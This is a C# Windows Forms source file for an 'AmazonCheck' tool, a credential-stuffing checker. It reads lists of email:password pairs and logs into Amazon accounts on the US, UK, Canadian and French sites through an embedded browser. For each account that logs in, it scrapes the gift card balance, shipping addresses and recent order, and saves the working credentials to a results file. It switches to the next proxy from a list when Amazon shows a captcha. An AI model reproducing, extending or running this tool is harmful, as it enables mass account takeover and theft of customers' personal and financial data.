using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using System.Runtime.InteropServices;


namespace AmazonCheck
{

    public partial class frmMain : Form
    {
        int loginRelay = 0;

        String StartUrl;
        String LoginUrl;
        String ShippingaddressUrl;
        String GiftcardUrl;
        String OrderUrl;
        String AfterloginUrl;
        String LoginFailedUrl;
        String LogoutUrl;
        String LogoutAfterUrl;

        String securityStr1 = "the security question";
        String securityStr2;
        String securityStr3 = "There was a problem with your request";

        String unmatchInfoStr = "There was an error with your E-Mail/Password combination";

        String resultTxtName = "";

        String prevUrl="";

        String[] strUserArray;
        int currentUserPos=-1;

        String[] strProxyArray;
        int currentProxyPos = -1;

        Thread m_GetUrlThread;
        bool m_bExitRequire = false;

        String m_strId;
        String m_strPassword;
        Publisher p = new Publisher();
        
        struct Struct_INTERNET_PROXY_INFO 
        { 
            public int dwAccessType; 
            public IntPtr proxy; 
            public IntPtr proxyBypass; 
        }; 

        [DllImport("wininet.dll", SetLastError = true)] 
        private static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int lpdwBufferLength);

        private void RefreshIESettings(string strProxy) 
        { 
            const int INTERNET_OPTION_PROXY = 38; 
            const int INTERNET_OPEN_TYPE_PROXY = 3; 

            Struct_INTERNET_PROXY_INFO struct_IPI; 

            // Filling in structure 
            struct_IPI.dwAccessType = INTERNET_OPEN_TYPE_PROXY; 
            struct_IPI.proxy = Marshal.StringToHGlobalAnsi(strProxy); 
            struct_IPI.proxyBypass = Marshal.StringToHGlobalAnsi("local"); 

            // Allocating memory 
            IntPtr intptrStruct = Marshal.AllocCoTaskMem(Marshal.SizeOf(struct_IPI)); 

            // Converting structure to IntPtr 
            Marshal.StructureToPtr(struct_IPI, intptrStruct, true); 

            bool iReturn = InternetSetOption(IntPtr.Zero, INTERNET_OPTION_PROXY, intptrStruct, Marshal.SizeOf(struct_IPI)); 
        } 


        public frmMain()
        {
            InitializeComponent();

       
            webBwmain.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(webview_DocumentCompleted);
            webBwmain.Navigated += Navigate_Completed;

            //p.SetVisitEvent += new Publisher.VisitDelegate(Visit);

        }
        //--------------------------------------------------------------------------------------------------------------------------
        public delegate void VisitDelegate(String strUrl);


        public void VisitFunc(String strUrl)
        {
            try
            {               
                System.Diagnostics.Process.Start(strUrl);
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex);
            }
            
        }

        public void Visit(String strTitle)
        {
            if (this.webBwmain.InvokeRequired)
            {
                Invoke(new VisitDelegate(VisitFunc), new object[] { strTitle });
            }
            else
            {
                VisitFunc(strTitle);
            }
        }

        //--------------------------------------------------------------------------------------------------------------------------

        private delegate String WebBrowserGetDocumentDelegate();

        public String WebBrowserGetDocumentFunc()
        {
            try
            {
                return webBwmain.Document.Body.InnerHtml;
            }
            catch (System.Exception ex)
            {
            	
            }
            return "";
            
        }

        public String WebBrowserGetDocument()
        {
            if (this.webBwmain.InvokeRequired)
            {
                try
                {
                    return (String)Invoke(new WebBrowserGetDocumentDelegate(WebBrowserGetDocumentFunc), new object[] { });
                }
                catch (System.Exception ex)
                {
                	
                }
                return null;
            }
            else
            {
                return WebBrowserGetDocumentFunc();
            }
        }
  
        //--------------------------------------------------------------------------------------------------------------------------

        private void LoadSetting()
        {
            String strCurrentDirectory = System.IO.Directory.GetCurrentDirectory();
            String strSaveFilePath = strCurrentDirectory + "\\setting.txt";
            String strRead;
            int nIndex = 0;

            try
            {
                System.IO.StreamReader file = new System.IO.StreamReader(strSaveFilePath);
                while ((strRead = file.ReadLine()) != null)
                {
                    System.Console.WriteLine(strRead);
                    if (nIndex == 0)
                        textBox_id.Text = strRead;
                    else if (nIndex == 1)
                        textBox_password.Text = strRead;
                    nIndex++;
                }

                file.Close();
            }
            catch (System.Exception ex)
            {

            }
        }

        private void SaveSetting()
        {
            String strCurrentDirectory = System.IO.Directory.GetCurrentDirectory();
            String strSaveFilePath = strCurrentDirectory + "\\setting.txt";
            string strWrite;

            try
            {
                StreamWriter SWrite = new StreamWriter(strSaveFilePath, false, System.Text.Encoding.UTF8);

                SWrite.WriteLine(textBox_id.Text);
                SWrite.WriteLine(textBox_password.Text);
                SWrite.Close();
            }
            catch (System.Exception ex)
            {

            }
        }

        private void SaveScrapResult(String resultString, bool appendFlag = true)
        {
            String strCurrentDirectory = System.IO.Directory.GetCurrentDirectory();
            if (resultTxtName == "") resultTxtName = "result";
            String strSaveFilePath = strCurrentDirectory + "\\" + resultTxtName + ".txt";

            try
            {
                StreamWriter SWrite = new StreamWriter(strSaveFilePath, appendFlag, System.Text.Encoding.UTF8);

                SWrite.WriteLine(resultString);
                SWrite.Close();
            }
            catch (System.Exception ex)
            {

            }
        }
        private void GetUrlThread()
        {
            String strHtml;
            int n1, n2, n3 = 0, n4;

             /*strHtml = WebBrowserGetDocument();
             if (strHtml != "")
             {
                 try
                 {
                     Console.WriteLine("Giftcard url check ");
                     n3 = strHtml.IndexOf("ja_searchfield");

                     if (n3 != -1)
                     {
                         strHtml = strHtml.Substring(n3);

                         strHtml = strHtml.ToLower();

                     }
                     //p.Visit(ShippingaddressUrl);

                 }
                 catch (System.Exception ex)
                 {
                     Console.WriteLine(ex);
                 }
                    

             }*/
            //Thread.Sleep(20);


        }
        private void PutLogScraping(String logString)
        {
            resultTextBox.Text = resultTextBox.Text + "\n" + logString;
        }


        // start button
        private void btnStart_Click(object sender, EventArgs e)
        {
            ClearCookie.ClearCookies();

            btnStart.Enabled = false;
            btnStop.Enabled = true;

            //Proxy Set
            if (lblProxysUrl.Text != "-")
            {
                strProxyArray = File.ReadAllLines(lblProxysUrl.Text);
                currentProxyPos = -1;
                resultTextBox.Text = "Proxy Connecting...";

               // NextProxy();
            }

            //webBwmain.Navigate("http://whatismyipaddress.com/");
                        

            if (rdoKindUS.Checked == true)
            {
                StartUrl = "https://www.amazon.com/gp/yourstore/home";
                /*
                //LoginUrl = "";
                ShippingaddressUrl = "https://www.amazon.com/gp/css/account/address/view.html?ie=UTF8";
                GiftcardUrl = "https://www.amazon.com/gp/css/gc/balance?ie=UTF8&ref=sv_gc_3";
                OrderUrl = "https://www.amazon.com/gp/css/order-history/ref=nav_youraccount_orders";
                AfterloginUrl = "https://www.amazon.com/gp/yourstore/home?ie=UTF8&ref_=cust_rec_intestitial_signin&";
                LoginFailedUrl = "https://www.amazon.com/ap/signin";
                */
                LoginUrl = "https://www.amazon.com/ap/signin?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%3Fie%3DUTF8%26ref_%3Dnav_yam_ya";
                ShippingaddressUrl = "https://www.amazon.com/gp/css/account/address/view.html?ie=UTF8";
                GiftcardUrl = "https://www.amazon.com/gp/css/gc/balance?ie=UTF8&ref=sv_gc_3";
                OrderUrl = "https://www.amazon.com/gp/css/order-history/ref=nav_youraccount_orders";
                AfterloginUrl = "https://www.amazon.com/gp/css/homepage.html?ie=UTF8&ref_=nav_yam_ya&";
                LoginFailedUrl = "https://www.amazon.com/ap/signin";
                LogoutUrl = "http://www.amazon.com/gp/flex/sign-out.html/ref=nav_youraccount_signout?ie=UTF8&action=sign-out&path=%2Fgp%2Fyourstore%2Fhome&signIn=1&useRedirectOnSuccess=1";
                LogoutAfterUrl = "https://www.amazon.com/ap/signin?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26action%3Dsign-out%26path%3D%252Fgp%252Fyourstore%252Fhome%26ref_%3Dnav_youraccount_signout%26signIn%3D1%26useRedirectOnSuccess%3D1";

                securityStr2 = "Important Message!";

            }
            else if(rdoKindUK.Checked == true)
            {
                StartUrl = "https://www.amazon.co.uk/gp/yourstore/home";
                LoginUrl = "";
                ShippingaddressUrl = "https://www.amazon.co.uk/gp/css/account/address/view.html?ie=UTF8";
                GiftcardUrl = "https://www.amazon.co.uk/gp/css/gc/balance?ie=UTF8&ref=sv_gc_3";
                OrderUrl = "https://www.amazon.co.uk/gp/css/order-history/ref=nav_youraccount_orders";
                AfterloginUrl = "https://www.amazon.co.uk/gp/yourstore/home?ie=UTF8&ref_=cust_rec_intestitial_signin&";
                LoginFailedUrl = "https://www.amazon.co.uk/ap/signin";
                securityStr2 = "Important Message!";

            }
            else if (rdoKindCA.Checked == true)
            {
                StartUrl = "https://www.amazon.ca/gp/yourstore/home";
                LoginUrl = "";
                ShippingaddressUrl = "https://www.amazon.ca/gp/css/account/address/view.html?ie=UTF8";
                GiftcardUrl = "https://www.amazon.ca/gp/css/gc/balance?ie=UTF8&ref=sv_gc_3";
                OrderUrl = "https://www.amazon.ca/gp/css/order-history/ref=nav_youraccount_orders";
                AfterloginUrl = "https://www.amazon.ca/gp/yourstore/home?ie=UTF8&ref_=cust_rec_intestitial_signin&";
                LoginFailedUrl = "https://www.amazon.ca/ap/signin";
                securityStr2 = "Important Message!";

            }
            else 
            {
                StartUrl = "https://www.amazon.fr/gp/yourstore/home";
                LoginUrl = "";
                ShippingaddressUrl = "https://www.amazon.fr/gp/css/account/address/view.html?ie=UTF8";
                GiftcardUrl = "https://www.amazon.fr/gp/css/gc/balance?ie=UTF8&ref=sv_gc_3";
                OrderUrl = "https://www.amazon.fr/gp/css/order-history/ref=nav_youraccount_orders";
                AfterloginUrl = "https://www.amazon.fr/gp/yourstore/home?ie=UTF8&ref_=cust_rec_intestitial_signin&";
                LoginFailedUrl = "https://www.amazon.fr/ap/signin";

                securityStr1 = "Pour continuer, veuillez répondre";
                securityStr2 = "Message important";
                securityStr3 = "";

                unmatchInfoStr = "Une erreur de combinaison E-mail/Mot de passe est survenue";
            }

            m_bExitRequire = false;
            

            resultTxtName = DateTime.Today.ToString("yyyy-MM-dd_") + DateTime.Now.ToString("HHmmss");
            SaveScrapResult("*** Scraping Result ("+resultTxtName+") ***", false);

            // Added this code for test
            /*String todayStr = DateTime.Today.ToString("MM-yyyy");
            if (todayStr != "01-2015")
            {
                Application.Exit();
                return;
            }*/

            PutLogScraping( "Start Scraping...");

            progressCtrl.Style = ProgressBarStyle.Continuous;
            progressCtrl.Minimum = 0;
            progressCtrl.Maximum = 10;
            progressCtrl.Step = 1;
            progressCtrl.Value = 0;

            try
            {
                strUserArray = File.ReadAllLines(lblSettingUrl.Text);
                strUserArray = strUserArray.Where(x => !string.IsNullOrEmpty(x)).ToArray();
                currentUserPos = -1;
                NextThread();
               
            }
            catch (System.Exception ex)
            {

            }
            

        }

        private void NextProxy()
        {
            String proxy_address;

            bool b_getProxy = false;
            while (b_getProxy == false)
            {
                currentProxyPos = currentProxyPos + 1;
                if (currentProxyPos >= strProxyArray.Length)
                {
                    b_getProxy = true;
                    PutLogScraping("Available Proxies no found");
                    return;
                }
                else
                {
                    proxy_address = "http://"+ strProxyArray[currentProxyPos];
                    try
                    {
                        var req = (HttpWebRequest)HttpWebRequest.Create("http://ip-api.com/json");
                        var resp = req.GetResponse();
                        var prev_json = new StreamReader(resp.GetResponseStream()).ReadToEnd();
                        req = (HttpWebRequest)HttpWebRequest.Create("http://ip-api.com/json");
                        req.Proxy = new WebProxy(proxy_address);
                        resp = req.GetResponse();
                        var json = new StreamReader(resp.GetResponseStream()).ReadToEnd();
                        //can't connect proxy
                        if (json.CompareTo(prev_json) == 0)
                        {
                            PutLogScraping("Can't connnect this proxy " + proxy_address);
                            NextProxy();
                        }
                        else
                        {
                            txtProxyServer.Text = proxy_address;
                            PutLogScraping("Connected proxy " + proxy_address);
                            RefreshIESettings(txtProxyServer.Text);
                            b_getProxy = true;
                        }
                    }
                    catch (System.Exception ex)
                    {
                        PutLogScraping("Can't connnect this proxy " + proxy_address);
                    }
                }
            }
        }

        private void NextThread()
        {
            if (m_bExitRequire == true) return;

            //ClearCookie.ClearCookies();
            if (currentUserPos < strUserArray.Length - 1)
            {
                progressCtrl.Value = 0;
                String[] exploded;

                try
                {
                    bool b_getUser = false;
                    while (b_getUser == false)
                    {
                        currentUserPos = currentUserPos + 1;
                        exploded = strUserArray[currentUserPos].Split(':');
                        if (exploded.Length == 2)
                        {
                            if (exploded[0] != "" && exploded[1] != "")
                            {
                                b_getUser = true;
                                textBox_id.Text = exploded[0];
                                textBox_password.Text = exploded[1];
                            }
                            else if (currentUserPos >= strUserArray.Length)
                            {
                                b_getUser = true;
                                return;
                            }
                        }
                        else
                        {
                            PutLogScraping("Incorrect User info - " + strUserArray[currentUserPos]);
                            b_getUser = false;
                        }
                    }
                }
                catch (System.Exception ex)
                {

                }

                m_strId = textBox_id.Text;
                m_strPassword = textBox_password.Text;
                

                if (LoginUrl == "")
                {
                    webBwmain.Navigate(StartUrl);
                }
                else
                {
                    webBwmain.Navigate(LoginUrl);
                }
            }   
            else
            {
                btnStart.Enabled = true;
                btnStop.Enabled = false;
                //PutLogScraping("Finished... You can get result in "+ resultTxtName+".txt");
                String strCurrentDirectory = System.IO.Directory.GetCurrentDirectory();
                String strResultFilePath = strCurrentDirectory + "\\"+resultTxtName+".txt";

                progressCtrl.Value = 0;
                m_bExitRequire = true;

                MessageBox.Show("Scrape Finished!");
                
                StreamReader sr = new StreamReader(strResultFilePath, Encoding.Default);
                resultTextBox.Text = sr.ReadToEnd();
                sr.Close();

            }
        }
 
        private void Navigate_Completed(object sender, EventArgs e)
        {
            int n1, n2;
            String strHtml;
            strHtml = WebBrowserGetDocument();
            WebBrowser wb = (WebBrowser)sender;

            if (strHtml == null || strHtml == "" || wb.Url.OriginalString == prevUrl) return;

            if (LoginUrl == "" && wb.Url.OriginalString.Contains(LoginFailedUrl))
            {
                LoginUrl = wb.Url.OriginalString;
                webBwmain.Navigate(LoginUrl);
            }            
            else if (wb.Url.OriginalString == LoginFailedUrl)
            {
                PutLogScraping("Login failed... ");
                NextThread();

            }

            else if (wb.Url.OriginalString == AfterloginUrl)
            {
                progressCtrl.Value = 2;
                SaveScrapResult("- " + m_strId + ":" + m_strPassword);
                webBwmain.Navigate(GiftcardUrl);
                PutLogScraping("Login Successfully... ");

            }

            else if (wb.Url.OriginalString.Contains(GiftcardUrl))
            {
                progressCtrl.Value = 4;
                if (strHtml != null && strHtml != "")
                {
                    HtmlElementCollection inputCol = wb.Document.GetElementsByTagName("H3");
                    foreach (HtmlElement el in inputCol)
                    {
                        //if (el.GetAttribute("className") == "gcBalanceBox redeemNarrow")
                        {
                            strHtml = el.InnerText;


                            if (rdoKindFR.Checked == true) n1 = strHtml.IndexOf("Solde du compte chèque-cadeau");
                            else n1 = strHtml.IndexOf("Your Gift Card");

                            if (n1 < 0) continue;
                            n2 = strHtml.IndexOf(":");
                            strHtml = strHtml.Substring(n2 + 1);
                            PutLogScraping("Getting Gift Card Balance... ");
                            SaveScrapResult(strHtml);

                        }
                    }
                    webBwmain.Navigate(ShippingaddressUrl);
                }

            }
            else if (wb.Url.OriginalString == ShippingaddressUrl)
            {
                if (strHtml != null && strHtml != "")
                {
                    progressCtrl.Value = 7;
                    HtmlElementCollection inputCol = wb.Document.GetElementsByTagName("UL");
                    foreach (HtmlElement el in inputCol)
                    {
                        if (el.GetAttribute("className") == "displayAddressUL")
                        {
                            strHtml = el.InnerText;

                            SaveScrapResult(strHtml);
                            PutLogScraping("Getting Shipping Addresses... ");

                        }

                    }
                    webBwmain.Navigate(OrderUrl);
                }
            }
            else if (wb.Url.OriginalString == OrderUrl)
            {
                if (strHtml != null && strHtml != "")
                {
                    progressCtrl.Value = 10;
                    String price = "", product = "";

                    HtmlElementCollection inputCol = wb.Document.GetElementsByTagName("DIV");
                    foreach (HtmlElement el in inputCol)
                    {
                        if (el.GetAttribute("className") == "a-box shipment shipment-is-delivered")
                        {
                            strHtml = el.InnerText;
                            if (strHtml == "") continue;
                            product = strHtml;
                            PutLogScraping("Getting Order Product... ");
                            break;
                        }
                    }

                    inputCol = wb.Document.GetElementsByTagName("DIV");
                    foreach (HtmlElement el in inputCol)
                    {
                        if (el.GetAttribute("className") == "a-row a-size-base")
                        {
                            strHtml = el.InnerText;

                            n1 = strHtml.IndexOf("$");
                            if (n1 < 0) n1 = strHtml.IndexOf("£");
                            if (n1 < 0) n1 = strHtml.IndexOf("EUR");

                            if (n1 < 0) continue;
                            price = strHtml;
                            PutLogScraping("Getting Order Price... ");
                            break;
                        }

                    }
                    product = product.Replace("Buy it Again Return or replace items Write a product review Archive Order", "");

                    SaveScrapResult(product + " " + price);

                    //PutLogScraping("Getting Orders... ");
                    strHtml = wb.Document.GetElementById("ordersContainer").InnerHtml;
                    webBwmain.Navigate(LogoutUrl);
                    Thread.Sleep(50);
                    NextThread();
                }
            }

            //Captcha check
            else if (strHtml != "")
            {
                if (strHtml.Contains("Enter the characters you see below"))
                {
                    PutLogScraping("Login Captcha needed... Connecting to other proxy...");
                    NextProxy();
                    if (m_bExitRequire == false)  webBwmain.Navigate(StartUrl);
                }
                else if (strHtml.Contains("Navigation to the webpage was canceled") || strHtml.Contains("Internet connectivity has been lost"))
                {
                    wb.Refresh();
                }

                else if (!wb.Url.Equals("about:blank"))
                {
                    wb.Refresh();
                }
            }

            prevUrl = wb.Url.OriginalString;

        }

        void webview_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            WebBrowser wb = (WebBrowser)sender;
            String strHtml;
            strHtml = WebBrowserGetDocument();
            if (strHtml == null || strHtml == "" ) return;
            //if(wb.Url.OriginalString == prevUrl)   return;

            if (LoginUrl == "" && wb.Url.OriginalString.Contains(LoginFailedUrl))
            {
                LoginUrl = wb.Url.OriginalString;
                webBwmain.Navigate(LoginUrl);
            }
            //after login
            else if (wb.Url.OriginalString == LoginUrl)
            {
                HtmlElementCollection inputCol = wb.Document.GetElementsByTagName("input");

                foreach (HtmlElement el in inputCol)
                {

                    if (el.Name == "email")
                        el.SetAttribute("value", m_strId);
                    else if (el.Name == "password")
                    {
                        el.InnerText = m_strPassword;
                    }
                    else if (el.Id == "signInSubmit-input")
                    {
                        el.InvokeMember("Click");
                        break;
                    }
                }
                progressCtrl.Value = 1;
                PutLogScraping("Loging in with " + m_strId + " : " + m_strPassword);
            }
            else if (wb.Url.OriginalString.Contains("res://ieframe.dll") )
            {
                wb.Refresh();
            }
            //broken Url
            else if (strHtml.Contains("Navigation to the webpage was canceled") || strHtml.Contains("Internet connectivity has been lost") || strHtml.Contains("not connected to the Internet."))
            {
                wb.Refresh();
            }
            else if (strHtml.Contains(securityStr1) || strHtml.Contains(securityStr2) || strHtml.Contains(securityStr3))
            {
                PutLogScraping("** Needed insert User security info... Step now. ");
                NextThread();
                if(m_bExitRequire==false) webBwmain.Navigate(LoginUrl);
                return;
            }
            else if (strHtml.Contains(unmatchInfoStr) )
            {
                PutLogScraping("** Incorrect User Email or password... Step now.");
                NextThread();
                if (m_bExitRequire == false)  webBwmain.Navigate(LoginUrl);
                return;
            }
                
            else if (strHtml.Contains("Enter the characters you see below"))
            {
                PutLogScraping("Login Captcha needed... Connecting to other proxy...");
                NextProxy();
                ClearCookie.ClearCookies();
                if (m_bExitRequire == false) webBwmain.Navigate(LoginUrl);
                return;
            }
            //prevUrl = wb.Url.OriginalString;

        }
         

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            m_bExitRequire = true;
        }

        private void btnClearcookie_Click(object sender, EventArgs e)
        {
            textBox_id.Enabled = false;
            textBox_password.Enabled = false;
            //button3.Enabled = false;
            btnStart.Enabled = false;
            btnStop.Enabled = false;
            
            ClearCookie.ClearCookies();
                        
            btnStart.Enabled = true;            
            textBox_id.Enabled = true;
            textBox_password.Enabled = true;
        }

        private void button_stop_Click(object sender, EventArgs e)
        {
            m_bExitRequire = true;
            webBwmain.Stop();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
        }

  
        private void btnOpen_Click(object sender, EventArgs e)
        {
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Title = "Open Amazon User info Text File";
            OFD.Filter = "TXT files|*.txt";


            if (OFD.ShowDialog() == DialogResult.OK)
            {

                this.lblSettingUrl.Text = OFD.FileName.ToString();
                StreamReader sr = new StreamReader(this.lblSettingUrl.Text, Encoding.Default);
                resultTextBox.Text = sr.ReadToEnd();
                sr.Close();

                if (resultTextBox.Text != "")
                {
                    btnStart.Enabled = true;
                    btnStop.Enabled = false;
                }
            }
        }

        private void btnOpenProxy_Click(object sender, EventArgs e)
        {
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Title = "Open Amazon User info Text File";
            OFD.Filter = "TXT files|*.txt";


            if (OFD.ShowDialog() == DialogResult.OK)
            {

                this.lblProxysUrl.Text = OFD.FileName.ToString();
                StreamReader sr = new StreamReader(this.lblProxysUrl.Text, Encoding.Default);
                resultTextBox.Text = sr.ReadToEnd();
                sr.Close();

            }

        }
              
       
    }

 
}
